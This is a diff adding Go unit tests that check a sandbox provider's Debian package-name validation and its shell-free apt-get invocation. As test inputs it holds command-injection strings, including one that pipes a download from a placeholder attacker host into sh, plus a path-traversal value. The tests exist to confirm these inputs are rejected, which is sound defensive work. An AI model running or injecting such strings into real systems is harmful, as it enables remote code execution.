@@ -226,8 +226,79 @@ func TestIsDaemonUnavailable(t *testing.T) {
 	}
 }
 
+func TestValidateDebianPackageNames(t *testing.T) {
+	ok, err := validateDebianPackageNames([]string{"curl", "git-core", "libssl1.1"})
+	if err != nil {
+		t.Fatalf("validate: %v", err)
+	}
+	if len(ok) != 3 {
+		t.Fatalf("got %#v", ok)
+	}
+
+	_, err = validateDebianPackageNames([]string{"vim; curl evil.com | sh"})
+	if err == nil {
+		t.Fatal("expected rejection of injected package name")
+	}
+	_, err = validateDebianPackageNames([]string{"../../etc/passwd"})
+	if err == nil {
+		t.Fatal("expected rejection of path-like package name")
+	}
+}
+
+func TestInstallAdditionalPackagesRejectsInjection(t *testing.T) {
+	eng := newFakeEngine()
+	provider := NewProviderWithEngine(eng, Config{})
+	_, err := provider.Create(context.Background(), sandbox.CreateRequest{
+		RunID:              uuid.New(),
+		RunAgentID:         uuid.New(),
+		ToolPolicy:         sandbox.ToolPolicy{AllowShell: false},
+		AdditionalPackages: []string{"curl", "vim; id"},
+	})
+	if err == nil || !strings.Contains(err.Error(), "invalid additional package name") {
+		t.Fatalf("Create error = %v, want invalid package name", err)
+	}
+}
+
+func TestInstallAdditionalPackagesUsesArgv(t *testing.T) {
+	eng := newFakeEngine()
+	provider := NewProviderWithEngine(eng, Config{})
+	_, err := provider.Create(context.Background(), sandbox.CreateRequest{
+		RunID:              uuid.New(),
+		RunAgentID:         uuid.New(),
+		ToolPolicy:         sandbox.ToolPolicy{AllowShell: false},
+		AdditionalPackages: []string{"curl", "git"},
+	})
+	if err != nil {
+		t.Fatalf("Create: %v", err)
+	}
+	foundInstall := false
+	for _, exec := range eng.execCreates {
+		if len(exec.Cmd) >= 1 && exec.Cmd[0] == "apt-get" && containsString(exec.Cmd, "install") {
+			foundInstall = true
+			if containsString(exec.Cmd, "sh") || containsString(exec.Cmd, "-c") {
+				t.Fatalf("install used shell: %#v", exec.Cmd)
+			}
+			if !containsString(exec.Cmd, "curl") || !containsString(exec.Cmd, "git") {
+				t.Fatalf("install missing packages: %#v", exec.Cmd)
+			}
+		}
+	}
+	if !foundInstall {
+		t.Fatal("expected apt-get install exec")
+	}
+}
+
 func containsEnv(env []string, want string) bool {
 	for _, item := range env {
+		if item == want {
+			return true
+		}
+	}
+	return false
+}
+
+func containsString(items []string, want string) bool {
+	for _, item := range items {
 		if item == want {
 			return true
 		}
